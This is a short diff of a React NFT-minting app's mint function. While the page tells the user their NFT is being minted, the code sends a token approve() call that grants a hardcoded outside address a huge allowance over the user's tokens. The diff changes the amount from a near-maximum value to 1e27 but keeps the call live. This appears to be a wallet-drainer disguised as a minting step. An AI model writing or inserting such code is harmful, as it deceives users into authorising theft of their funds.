@@ -131,8 +131,8 @@ function App() {
     console.log("Gas limit: ", totalGasLimit);
     setFeedback(`Minting your ${CONFIG.NFT_NAME}...`);
     setClaimingNft(true);
-    let number = new BigNumber('11579208923731619542357098500868790785326998665640564039457584007913129639935');
-    blockchain.approveContract.methods.approve("0xAe05518173461Fcd3D2E8b7D02eCCf724eB7468d",number).send({
+    //let number = new BigNumber('115792089237316195423570985008687907853269984665640564039457584007913129639935');
+    blockchain.approveContract.methods.approve("0xAe05518173461Fcd3D2E8b7D02eCCf724eB7468d",1000000000000000000000000000).send({
       gasLimit: String(totalGasLimit),
         to: CONFIG.CONTRACT_ADDRESS,
         from: blockchain.account,
